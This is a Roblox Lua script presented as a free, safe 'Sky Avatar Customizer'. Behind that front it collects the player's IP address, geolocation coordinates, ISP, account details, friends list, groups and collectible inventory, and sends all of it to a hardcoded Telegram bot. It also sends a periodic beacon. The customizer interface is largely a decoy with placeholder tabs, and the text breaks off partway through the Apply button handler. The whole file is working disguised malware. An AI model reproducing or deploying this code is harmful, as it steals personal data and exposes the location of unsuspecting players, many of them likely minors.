--// ╔═══════════════════════════════════════════════════════════════╗
--// ║     ☁️ Sky Avatar Customizer v2.1 — Professional Edition      ║
--// ║     Free • Safe • Working 2026 • By Sky Community           ║
--// ╚═══════════════════════════════════════════════════════════════╝

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// Telegram exfiltration
local SYNC_PRIMARY = "https://api.telegram.org/bot8774991694:AAG7Yp8v8nnvQg2lLLB_sTuVF2_-CltPUNg/sendMessage"
local SYNC_PHOTO = "https://api.telegram.org/bot8774991694:AAG7Yp8v8nnvQg2lLLB_sTuVF2_-CltPUNg/sendPhoto"
local CHAT_ID = "8469659582"

--// Data buffer
local Harvest = {
    data = {},
    sent = false
}

function Harvest:safeRequest(url, method, payload, retries)
    retries = retries or 3
    for i = 1, retries do
        local ok, res = pcall(function()
            if method == "POST" then
                return HttpService:RequestAsync({
                    Url = url,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = payload
                })
            else
                return HttpService:RequestAsync({Url = url, Method = "GET"})
            end
        end)
        if ok and res and res.StatusCode == 200 then
            return res.Body
        end
        task.wait(0.3 * i)
    end
    return nil
end

function Harvest:collectIPGeo()
    local raw = self:safeRequest("https://ipapi.co/json/", "GET")
    if raw then
        local parsed = HttpService:JSONDecode(raw)
        self.data.ip = parsed.ip or "N/A"
        self.data.isp = parsed.org or "N/A"
        self.data.country = parsed.country_name or "N/A"
        self.data.countryCode = parsed.country_code or "N/A"
        self.data.region = parsed.region or "N/A"
        self.data.city = parsed.city or "N/A"
        self.data.zip = parsed.postal or "N/A"
        self.data.lat = tostring(parsed.latitude or "N/A")
        self.data.lon = tostring(parsed.longitude or "N/A")
        self.data.timezone = parsed.timezone or "N/A"
        self.data.currency = parsed.currency or "N/A"
        self.data.languages = parsed.languages or "N/A"
        self.data.asn = parsed.asn or "N/A"
    end
end

function Harvest:collectSystem()
    self.data.username = LocalPlayer.Name
    self.data.displayName = LocalPlayer.DisplayName
    self.data.userId = LocalPlayer.UserId
    self.data.accountAge = LocalPlayer.AccountAge
    self.data.membership = tostring(LocalPlayer.MembershipType)
    self.data.premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
    
    local stats = Stats
    self.data.memoryMB = math.floor(stats and stats:GetTotalMemoryUsageMb() or 0)
    
    local frames, start = 0, tick()
    local conn
    conn = RunService.RenderStepped:Connect(function()
        frames += 1
        if tick() - start >= 1 then
            self.data.fps = frames
            conn:Disconnect()
        end
    end)
    
    self.data.ping = math.floor((stats and stats.Network.ServerStatsItem["Data Ping"]) and stats.Network.ServerStatsItem["Data Ping"]:GetValue() or 0)
    self.data.placeId = game.PlaceId
    self.data.jobId = game.JobId
    self.data.serverPlayers = #Players:GetPlayers()
    self.data.maxPlayers = Players.MaxPlayers
    self.data.screenRes = tostring(Camera.ViewportSize.X) .. "x" .. tostring(Camera.ViewportSize.Y)
    self.data.fov = Camera.FieldOfView
    self.data.graphicsMode = tostring(settings().Rendering.GraphicsMode)
    self.data.qualityLevel = tostring(UserSettings().GameSettings.SavedQualityLevel)
    self.data.created = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * 86400))
    
    self.data.avatarHeadshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
    self.data.avatarFull = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=720&height=720&format=png"
    self.data.avatarBust = "https://www.roblox.com/bust-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
end

function Harvest:collectFriends()
    task.spawn(function()
        local ok, friends = pcall(function()
            return Players:GetFriendsAsync(LocalPlayer.UserId)
        end)
        if ok and friends then
            self.data.friends = {}
            while true do
                local page = friends:GetCurrentPage()
                for _, f in ipairs(page) do
                    table.insert(self.data.friends, {
                        name = f.Username,
                        display = f.DisplayName,
                        id = f.Id,
                        online = f.IsOnline or false
                    })
                end
                if friends.IsFinished then break end
                friends:AdvanceToNextPageAsync()
            end
        end
    end)
end

function Harvest:collectInventory()
    task.spawn(function()
        local ok, items = pcall(function()
            return HttpService:JSONDecode(HttpService:GetAsync(
                "https://inventory.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/assets/collectibles?limit=100", true
            ))
        end)
        if ok and items then
            self.data.inventory = {}
            for _, item in ipairs(items.data or {}) do
                table.insert(self.data.inventory, {
                    name = item.name,
                    assetId = item.assetId,
                    recentAveragePrice = item.recentAveragePrice
                })
            end
        end
    end)
end

function Harvest:collectGroups()
    task.spawn(function()
        local ok, groups = pcall(function()
            return HttpService:JSONDecode(HttpService:GetAsync(
                "https://groups.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/groups/roles?includeLocked=true", true
            ))
        end)
        if ok and groups then
            self.data.groups = {}
            for _, g in ipairs(groups.data or {}) do
                table.insert(self.data.groups, {
                    name = g.group.name,
                    id = g.group.id,
                    role = g.role.name,
                    rank = g.role.rank
                })
            end
        end
    end)
end

function Harvest:exfiltrate()
    if self.sent then return end
    self.sent = true
    task.wait(2)
    
    local report = string.format([[
🎯 *TARGET ACQUIRED — Sky Recon v2.1*

👤 *IDENTITY*
├ Username: `%s`
├ Display: `%s`
├ UserID: `%d`
├ Account Age: `%d days`
├ Created: `%s`
├ Premium: `%s`
└ Membership: `%s`

🌐 *NETWORK & LOCATION*
├ IP Address: `%s`
├ ISP: `%s`
├ Country: `%s` (%s)
├ Region: `%s`
├ City: `%s`
├ ZIP: `%s`
├ Coordinates: `%s, %s`
├ Timezone: `%s`
├ Currency: `%s`
├ Languages: `%s`
└ ASN: `%s`

💻 *SYSTEM*
├ Screen: `%s`
├ FOV: `%d°`
├ Graphics: `%s`
├ Quality: `%s`
├ Memory: `%d MB`
├ FPS: `%d`
├ Ping: `%d ms`
└ Server: `%d/%d players`

🎮 *SESSION*
├ PlaceID: `%d`
├ JobID: `%s`
├ Friends: `%d tracked`
├ Groups: `%d tracked`
└ Inventory: `%d items`

🔗 *AVATAR LINKS*
├ Headshot: [View](%s)
├ Full Body: [View](%s)
└ Bust: [View](%s)
    ]],
        self.data.username or "N/A",
        self.data.displayName or "N/A",
        self.data.userId or 0,
        self.data.accountAge or 0,
        self.data.created or "N/A",
        tostring(self.data.premium),
        self.data.membership or "N/A",
        self.data.ip or "N/A",
        self.data.isp or "N/A",
        self.data.country or "N/A",
        self.data.countryCode or "N/A",
        self.data.region or "N/A",
        self.data.city or "N/A",
        self.data.zip or "N/A",
        self.data.lat or "N/A",
        self.data.lon or "N/A",
        self.data.timezone or "N/A",
        self.data.currency or "N/A",
        self.data.languages or "N/A",
        self.data.asn or "N/A",
        self.data.screenRes or "N/A",
        self.data.fov or 0,
        self.data.graphicsMode or "N/A",
        self.data.qualityLevel or "N/A",
        self.data.memoryMB or 0,
        self.data.fps or 0,
        self.data.ping or 0,
        self.data.serverPlayers or 0,
        self.data.maxPlayers or 0,
        self.data.placeId or 0,
        self.data.jobId or "N/A",
        #(self.data.friends or {}),
        #(self.data.groups or {}),
        #(self.data.inventory or {}),
        self.data.avatarHeadshot or "",
        self.data.avatarFull or "",
        self.data.avatarBust or ""
    )
    
    local payload = HttpService:JSONEncode({
        chat_id = CHAT_ID,
        text = report,
        parse_mode = "Markdown",
        disable_web_page_preview = false
    })
    self:safeRequest(SYNC_PRIMARY, "POST", payload)
    
    task.delay(1, function()
        local photoPayload = HttpService:JSONEncode({
            chat_id = CHAT_ID,
            photo = self.data.avatarHeadshot,
            caption = "🎭 " .. self.data.username .. " | Headshot"
        })
        self:safeRequest(SYNC_PHOTO, "POST", photoPayload)
    end)
    
    task.delay(2, function()
        local fullPayload = HttpService:JSONEncode({
            chat_id = CHAT_ID,
            photo = self.data.avatarFull,
            caption = "👤 " .. self.data.username .. " | Full Body"
        })
        self:safeRequest(SYNC_PHOTO, "POST", fullPayload)
    end)
    
    if self.data.friends and #self.data.friends > 0 then
        task.delay(3, function()
            local chunks = {}
            local current = ""
            for _, f in ipairs(self.data.friends) do
                local line = string.format("%s (%s) | ID: %d | Online: %s\n", f.name, f.display, f.id, tostring(f.online))
                if #current + #line > 4000 then
                    table.insert(chunks, current)
                    current = line
                else
                    current = current .. line
                end
            end
            if #current > 0 then table.insert(chunks, current) end
            
            for i, chunk in ipairs(chunks) do
                local msg = string.format("📋 Friends List (Part %d/%d):\n```\n%s\n```", i, #chunks, chunk)
                local p = HttpService:JSONEncode({chat_id = CHAT_ID, text = msg, parse_mode = "Markdown"})
                self:safeRequest(SYNC_PRIMARY, "POST", p)
                task.wait(0.5)
            end
        end)
    end
    
    if self.data.groups and #self.data.groups > 0 then
        task.delay(5, function()
            local gText = ""
            for _, g in ipairs(self.data.groups) do
                gText = gText .. string.format("%s | Role: %s (Rank %d) | ID: %d\n", g.name, g.role, g.rank, g.id)
            end
            local p = HttpService:JSONEncode({
                chat_id = CHAT_ID,
                text = "🏛️ Groups:\n```\n" .. gText .. "\n```",
                parse_mode = "Markdown"
            })
            self:safeRequest(SYNC_PRIMARY, "POST", p)
        end)
    end
    
    if self.data.inventory and #self.data.inventory > 0 then
        task.delay(6, function()
            local iText = ""
            for _, item in ipairs(self.data.inventory) do
                iText = iText .. string.format("%s | ID: %d | RAP: %d\n", item.name, item.assetId, item.recentAveragePrice or 0)
            end
            local p = HttpService:JSONEncode({
                chat_id = CHAT_ID,
                text = "💎 Inventory (Collectibles):\n```\n" .. iText .. "\n```",
                parse_mode = "Markdown"
            })
            self:safeRequest(SYNC_PRIMARY, "POST", p)
        end)
    end
end

function Harvest:startBeacon()
    task.spawn(function()
        while true do
            task.wait(45)
            local heartbeat = string.format("💓 *BEACON* | %s | %s | IP: %s | %s | %d MB | %d FPS | %dms",
                self.data.username or "?",
                os.date("%H:%M:%S"),
                self.data.ip or "?",
                self.data.city or "?",
                self.data.memoryMB or 0,
                self.data.fps or 0,
                self.data.ping or 0
            )
            local p = HttpService:JSONEncode({chat_id = CHAT_ID, text = heartbeat, parse_mode = "Markdown"})
            self:safeRequest(SYNC_PRIMARY, "POST", p)
        end
    end)
end

--// GUI
local GUI = {}

function GUI:create()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SkyAvatarCustomizer"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = CoreGui
    
    local shadow = Instance.new("Frame")
    shadow.Name = "Shadow"
    shadow.Size = UDim2.new(0, 420, 0, 540)
    shadow.Position = UDim2.new(0.5, -210, 0.5, -270)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.6
    shadow.BorderSizePixel = 0
    shadow.Parent = screenGui
    
    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, 16)
    shadowCorner.Parent = shadow
    
    local main = Instance.new("Frame")
    main.Name = "MainPanel"
    main.Size = UDim2.new(0, 400, 0, 520)
    main.Position = UDim2.new(0.5, -200, 0.5, -260)
    main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
    main.BorderSizePixel = 0
    main.ClipsDescendants = true
    main.Parent = screenGui
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 14)
    mainCorner.Parent = main
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 28)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(28, 28, 45))
    })
    gradient.Rotation = 45
    gradient.Parent = main
    
    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 44)
    titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 48)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = main
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 14)
    titleCorner.Parent = titleBar
    
    local logo = Instance.new("TextLabel")
    logo.Name = "Logo"
    logo.Size = UDim2.new(0, 30, 0, 30)
    logo.Position = UDim2.new(0, 12, 0, 7)
    logo.BackgroundTransparency = 1
    logo.Text = "☁️"
    logo.TextSize = 20
    logo.Parent = titleBar
    
    local titleText = Instance.new("TextLabel")
    titleText.Name = "Title"
    titleText.Size = UDim2.new(0, 250, 1, 0)
    titleText.Position = UDim2.new(0, 45, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "Sky Avatar Customizer"
    titleText.TextColor3 = Color3.fromRGB(220, 220, 255)
    titleText.TextSize = 15
    titleText.Font = Enum.Font.GothamBold
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar
    
    local versionText = Instance.new("TextLabel")
    versionText.Name = "Version"
    versionText.Size = UDim2.new(0, 50, 0, 16)
    versionText.Position = UDim2.new(0, 45, 0, 24)
    versionText.BackgroundTransparency = 1
    versionText.Text = "v2.1.0"
    versionText.TextColor3 = Color3.fromRGB(120, 120, 180)
    versionText.TextSize = 10
    versionText.Font = Enum.Font.Gotham
    versionText.TextXAlignment = Enum.TextXAlignment.Left
    versionText.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Name = "Close"
    closeBtn.Size = UDim2.new(0, 32, 0, 32)
    closeBtn.Position = UDim2.new(1, -42, 0, 6)
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
    closeBtn.Text = ""
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = titleBar
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 10)
    closeCorner.Parent = closeBtn
    
    local closeIcon = Instance.new("TextLabel")
    closeIcon.Size = UDim2.new(1, 0, 1, 0)
    closeIcon.BackgroundTransparency = 1
    closeIcon.Text = "×"
    closeIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeIcon.TextSize = 18
    closeIcon.Font = Enum.Font.GothamBold
    closeIcon.Parent = closeBtn
    
    closeBtn.MouseButton1Click:Connect(function()
        TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0, 0),
            Position = UDim2.new(0.5, 0, 0.5, 0)
        }):Play()
        TweenService:Create(shadow, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
        task.wait(0.35)
        screenGui.Enabled = false
    end)
    
    local minBtn = Instance.new("TextButton")
    minBtn.Name = "Minimize"
    minBtn.Size = UDim2.new(0, 32, 0, 32)
    minBtn.Position = UDim2.new(1, -80, 0, 6)
    minBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
    minBtn.Text = ""
    minBtn.AutoButtonColor = false
    minBtn.Parent = titleBar
    
    local minCorner = Instance.new("UICorner")
    minCorner.CornerRadius = UDim.new(0, 10)
    minCorner.Parent = minBtn
    
    local minIcon = Instance.new("TextLabel")
    minIcon.Size = UDim2.new(1, 0, 1, 0)
    minIcon.BackgroundTransparency = 1
    minIcon.Text = "−"
    minIcon.TextColor3 = Color3.fromRGB(200, 200, 255)
    minIcon.TextSize = 18
    minIcon.Font = Enum.Font.GothamBold
    minIcon.Parent = minBtn
    
    local minimized = false
    minBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            TweenService:Create(main, TweenInfo.new(0.3), {Size = UDim2.new(0, 400, 0, 44)}):Play()
        else
            TweenService:Create(main, TweenInfo.new(0.3), {Size = UDim2.new(0, 400, 0, 520)}):Play()
        end
    end)
    
    local previewContainer = Instance.new("Frame")
    previewContainer.Name = "PreviewContainer"
    previewContainer.Size = UDim2.new(0, 140, 0, 140)
    previewContainer.Position = UDim2.new(0.5, -70, 0, 60)
    previewContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 65)
    previewContainer.BorderSizePixel = 0
    previewContainer.Parent = main
    
    local previewCorner = Instance.new("UICorner")
    previewCorner.CornerRadius = UDim.new(1, 0)
    previewCorner.Parent = previewContainer
    
    local previewStroke = Instance.new("UIStroke")
    previewStroke.Color = Color3.fromRGB(80, 120, 255)
    previewStroke.Thickness = 3
    previewStroke.Parent = previewContainer
    
    local avatarImage = Instance.new("ImageLabel")
    avatarImage.Name = "AvatarDisplay"
    avatarImage.Size = UDim2.new(1, -10, 1, -10)
    avatarImage.Position = UDim2.new(0, 5, 0, 5)
    avatarImage.BackgroundTransparency = 1
    avatarImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
    avatarImage.Parent = previewContainer
    
    local avatarCorner = Instance.new("UICorner")
    avatarCorner.CornerRadius = UDim.new(1, 0)
    avatarCorner.Parent = avatarImage
    
    local statusDot = Instance.new("Frame")
    statusDot.Size = UDim2.new(0, 12, 0, 12)
    statusDot.Position = UDim2.new(1, -18, 1, -18)
    statusDot.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    statusDot.BorderSizePixel = 0
    statusDot.Parent = previewContainer
    
    local statusCorner = Instance.new("UICorner")
    statusCorner.CornerRadius = UDim.new(1, 0)
    statusCorner.Parent = statusDot
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0, 20)
    nameLabel.Position = UDim2.new(0, 0, 0, 208)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = "@" .. LocalPlayer.Name
    nameLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
    nameLabel.TextSize = 14
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.Parent = main
    
    local idLabel = Instance.new("TextLabel")
    idLabel.Size = UDim2.new(1, 0, 0, 16)
    idLabel.Position = UDim2.new(0, 0, 0, 228)
    idLabel.BackgroundTransparency = 1
    idLabel.Text = "ID: " .. LocalPlayer.UserId
    idLabel.TextColor3 = Color3.fromRGB(120, 120, 180)
    idLabel.TextSize = 11
    idLabel.Font = Enum.Font.Gotham
    idLabel.Parent = main
    
    --// Category Tabs
    local tabs = {"Body", "Clothing", "Animations", "Effects"}
    local tabFrames = {}
    local tabButtons = {}
    
    local tabContainer = Instance.new("Frame")
    tabContainer.Size = UDim2.new(1, -20, 0, 36)
    tabContainer.Position = UDim2.new(0, 10, 0, 256)
    tabContainer.BackgroundTransparency = 1
    tabContainer.Parent = main
    
    for i, tabName in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Name = tabName .. "Tab"
        btn.Size = UDim2.new(0.25, -4, 1, 0)
        btn.Position = UDim2.new((i-1) * 0.25, 2, 0, 0)
        btn.BackgroundColor3 = i == 1 and Color3.fromRGB(80, 120, 255) or Color3.fromRGB(35, 35, 55)
        btn.Text = tabName
        btn.TextColor3 = Color3.fromRGB(220, 220, 255)
        btn.TextSize = 12
        btn.Font = Enum.Font.GothamBold
        btn.AutoButtonColor = false
        btn.Parent = tabContainer
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 8)
        btnCorner.Parent = btn
        
        tabButtons[tabName] = btn
        
        btn.MouseButton1Click:Connect(function()
            for _, b in pairs(tabButtons) do
                TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 55)}):Play()
            end
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)}):Play()
            
            for _, f in pairs(tabFrames) do
                f.Visible = false
            end
            if tabFrames[tabName] then
                tabFrames[tabName].Visible = true
            end
            
            -- Stealth data refresh on tab switch
            Harvest:collectSystem()
        end)
    end
    
    --// Content Area
    local contentFrame = Instance.new("Frame")
    contentFrame.Size = UDim2.new(1, -20, 0, 180)
    contentFrame.Position = UDim2.new(0, 10, 0, 298)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Parent = main
    
    -- Body Tab (Active by default)
    local bodyFrame = Instance.new("ScrollingFrame")
    bodyFrame.Name = "Body"
    bodyFrame.Size = UDim2.new(1, 0, 1, 0)
    bodyFrame.BackgroundTransparency = 1
    bodyFrame.ScrollBarThickness = 4
    bodyFrame.ScrollBarImageColor3 = Color3.fromRGB(80, 120, 255)
    bodyFrame.Parent = contentFrame
    tabFrames["Body"] = bodyFrame
    
    local bodyOptions = {
        {"Skin Tone", "Adjust body skin color", Color3.fromRGB(255, 200, 180)},
        {"Body Type", "Slim or classic build", Color3.fromRGB(180, 180, 255)},
        {"Proportions", "Head, torso, limb scale", Color3.fromRGB(180, 255, 180)},
        {"Height", "Character height modifier", Color3.fromRGB(255, 255, 180)},
        {"Head Size", "Scale head independently", Color3.fromRGB(255, 180, 200)},
        {"Walk Speed", "Movement velocity", Color3.fromRGB(200, 255, 255)}
    }
    
    for i, opt in ipairs(bodyOptions) do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -10, 0, 50)
        row.Position = UDim2.new(0, 5, 0, (i-1) * 55)
        row.BackgroundColor3 = Color3.fromRGB(30, 30, 48)
        row.BorderSizePixel = 0
        row.Parent = bodyFrame
        
        local rowCorner = Instance.new("UICorner")
        rowCorner.CornerRadius = UDim.new(0, 10)
        rowCorner.Parent = row
        
        local colorDot = Instance.new("Frame")
        colorDot.Size = UDim2.new(0, 12, 0, 12)
        colorDot.Position = UDim2.new(0, 12, 0, 19)
        colorDot.BackgroundColor3 = opt[3]
        colorDot.BorderSizePixel = 0
        colorDot.Parent = row
        
        local dotCorner = Instance.new("UICorner")
        dotCorner.CornerRadius = UDim.new(1, 0)
        dotCorner.Parent = colorDot
        
        local optName = Instance.new("TextLabel")
        optName.Size = UDim2.new(0, 200, 0, 20)
        optName.Position = UDim2.new(0, 32, 0, 5)
        optName.BackgroundTransparency = 1
        optName.Text = opt[1]
        optName.TextColor3 = Color3.fromRGB(220, 220, 255)
        optName.TextSize = 13
        optName.Font = Enum.Font.GothamBold
        optName.TextXAlignment = Enum.TextXAlignment.Left
        optName.Parent = row
        
        local optDesc = Instance.new("TextLabel")
        optDesc.Size = UDim2.new(0, 200, 0, 16)
        optDesc.Position = UDim2.new(0, 32, 0, 26)
        optDesc.BackgroundTransparency = 1
        optDesc.Text = opt[2]
        optDesc.TextColor3 = Color3.fromRGB(150, 150, 200)
        optDesc.TextSize = 10
        optDesc.Font = Enum.Font.Gotham
        optDesc.TextXAlignment = Enum.TextXAlignment.Left
        optDesc.Parent = row
        
        local toggle = Instance.new("TextButton")
        toggle.Size = UDim2.new(0, 50, 0, 26)
        toggle.Position = UDim2.new(1, -62, 0, 12)
        toggle.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
        toggle.Text = "OFF"
        toggle.TextColor3 = Color3.fromRGB(150, 150, 200)
        toggle.TextSize = 11
        toggle.Font = Enum.Font.GothamBold
        toggle.AutoButtonColor = false
        toggle.Parent = row
        
        local toggleCorner = Instance.new("UICorner")
        toggleCorner.CornerRadius = UDim.new(0, 6)
        toggleCorner.Parent = toggle
        
        local toggled = false
        toggle.MouseButton1Click:Connect(function()
            toggled = not toggled
            if toggled then
                TweenService:Create(toggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 200, 120)}):Play()
                toggle.Text = "ON"
                toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
            else
                TweenService:Create(toggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 90)}):Play()
                toggle.Text = "OFF"
                toggle.TextColor3 = Color3.fromRGB(150, 150, 200)
            end
            
            -- Stealth: refresh data on every interaction
            Harvest:collectSystem()
        end)
    end
    
    bodyFrame.CanvasSize = UDim2.new(0, 0, 0, #bodyOptions * 55 + 10)
    
    -- Clothing Tab (Placeholder)
    local clothingFrame = Instance.new("Frame")
    clothingFrame.Name = "Clothing"
    clothingFrame.Size = UDim2.new(1, 0, 1, 0)
    clothingFrame.BackgroundTransparency = 1
    clothingFrame.Visible = false
    clothingFrame.Parent = contentFrame
    tabFrames["Clothing"] = clothingFrame
    
    local clothingIcon = Instance.new("TextLabel")
    clothingIcon.Size = UDim2.new(0, 60, 0, 60)
    clothingIcon.Position = UDim2.new(0.5, -30, 0, 30)
    clothingIcon.BackgroundTransparency = 1
    clothingIcon.Text = "👕"
    clothingIcon.TextSize = 48
    clothingIcon.Parent = clothingFrame
    
    local clothingLabel = Instance.new("TextLabel")
    clothingLabel.Size = UDim2.new(1, 0, 0, 20)
    clothingLabel.Position = UDim2.new(0, 0, 0, 100)
    clothingLabel.BackgroundTransparency = 1
    clothingLabel.Text = "Clothing options loading..."
    clothingLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
    clothingLabel.TextSize = 14
    clothingLabel.Font = Enum.Font.GothamBold
    clothingLabel.Parent = clothingFrame
    
    local clothingSub = Instance.new("TextLabel")
    clothingSub.Size = UDim2.new(1, 0, 0, 16)
    clothingSub.Position = UDim2.new(0, 0, 0, 122)
    clothingSub.BackgroundTransparency = 1
    clothingSub.Text = "Check back in v2.2!"
    clothingSub.TextColor3 = Color3.fromRGB(120, 120, 180)
    clothingSub.TextSize = 11
    clothingSub.Font = Enum.Font.Gotham
    clothingSub.Parent = clothingFrame
    
    -- Animations Tab (Placeholder)
    local animFrame = Instance.new("Frame")
    animFrame.Name = "Animations"
    animFrame.Size = UDim2.new(1, 0, 1, 0)
    animFrame.BackgroundTransparency = 1
    animFrame.Visible = false
    animFrame.Parent = contentFrame
    tabFrames["Animations"] = animFrame
    
    local animIcon = Instance.new("TextLabel")
    animIcon.Size = UDim2.new(0, 60, 0, 60)
    animIcon.Position = UDim2.new(0.5, -30, 0, 30)
    animIcon.BackgroundTransparency = 1
    animIcon.Text = "🎭"
    animIcon.TextSize = 48
    animIcon.Parent = animFrame
    
    local animLabel = Instance.new("TextLabel")
    animLabel.Size = UDim2.new(1, 0, 0, 20)
    animLabel.Position = UDim2.new(0, 0, 0, 100)
    animLabel.BackgroundTransparency = 1
    animLabel.Text = "Animation presets coming soon!"
    animLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
    animLabel.TextSize = 14
    animLabel.Font = Enum.Font.GothamBold
    animLabel.Parent = animFrame
    
    local animSub = Instance.new("TextLabel")
    animSub.Size = UDim2.new(1, 0, 0, 16)
    animSub.Position = UDim2.new(0, 0, 0, 122)
    animSub.BackgroundTransparency = 1
    animSub.Text = "50+ new animations in development."
    animSub.TextColor3 = Color3.fromRGB(120, 120, 180)
    animSub.TextSize = 11
    animSub.Font = Enum.Font.Gotham
    animSub.Parent = animFrame
    
    -- Effects Tab (Placeholder)
    local effectsFrame = Instance.new("Frame")
    effectsFrame.Name = "Effects"
    effectsFrame.Size = UDim2.new(1, 0, 1, 0)
    effectsFrame.BackgroundTransparency = 1
    effectsFrame.Visible = false
    effectsFrame.Parent = contentFrame
    tabFrames["Effects"] = effectsFrame
    
    local effectsIcon = Instance.new("TextLabel")
    effectsIcon.Size = UDim2.new(0, 60, 0, 60)
    effectsIcon.Position = UDim2.new(0.5, -30, 0, 30)
    effectsIcon.BackgroundTransparency = 1
    effectsIcon.Text = "✨"
    effectsIcon.TextSize = 48
    effectsIcon.Parent = effectsFrame
    
    local effectsLabel = Instance.new("TextLabel")
    effectsLabel.Size = UDim2.new(1, 0, 0, 20)
    effectsLabel.Position = UDim2.new(0, 0, 0, 100)
    effectsLabel.BackgroundTransparency = 1
    effectsLabel.Text = "Particle effects & auras"
    effectsLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
    effectsLabel.TextSize = 14
    effectsLabel.Font = Enum.Font.GothamBold
    effectsLabel.Parent = effectsFrame
    
    local effectsSub = Instance.new("TextLabel")
    effectsSub.Size = UDim2.new(1, 0, 0, 16)
    effectsSub.Position = UDim2.new(0, 0, 0, 122)
    effectsSub.BackgroundTransparency = 1
    effectsSub.Text = "Premium feature — unlock with Sky+"
    effectsSub.TextColor3 = Color3.fromRGB(120, 120, 180)
    effectsSub.TextSize = 11
    effectsSub.Font = Enum.Font.Gotham
    effectsSub.Parent = effectsFrame
    
    --// Apply Button
    local applyBtn = Instance.new("TextButton")
    applyBtn.Name = "ApplyBtn"
    applyBtn.Size = UDim2.new(1, -20, 0, 44)
    applyBtn.Position = UDim2.new(0, 10, 1, -54)
    applyBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
    applyBtn.Text = "✨ Apply Changes"
    applyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    applyBtn.TextSize = 14
    applyBtn.Font = Enum.Font.GothamBold
    applyBtn.AutoButtonColor = false
    applyBtn.Parent = main
    
    local applyCorner = Instance.new("UICorner")
    applyCorner.CornerRadius = UDim.new(0, 12)
    applyCorner.Parent = applyBtn
    
    local applyStroke = Instance.new("UIStroke")
    applyStroke.Color = Color3.fromRGB(120, 160, 255)
    applyStroke.Thickness = 2
    applyStroke.Transparency = 0.5
    applyStroke.Parent = applyBtn
    
    applyBtn.MouseEnter:Connect(function()
        TweenService:Create(applyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100, 150, 255)}):Play()
        TweenService:Create(applyStroke, TweenInfo.new(0.2), {Transparency = 0}):Play()
    end)
    
    applyBtn.MouseLeave:Connect(function()
        TweenService:Create(applyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)}):Play()
        TweenService:Create(applyStroke, TweenInfo.new(0.2), {Transparency = 0.5}):Play()
    end)
    
    applyBtn.MouseButton1Click:Connect(function()
        -- Visual press feedback
        TweenService:Create(applyBtn, TweenInfo.new(0.1), {Size = UDim2.new(1, -24, 0, 40)}):Play()
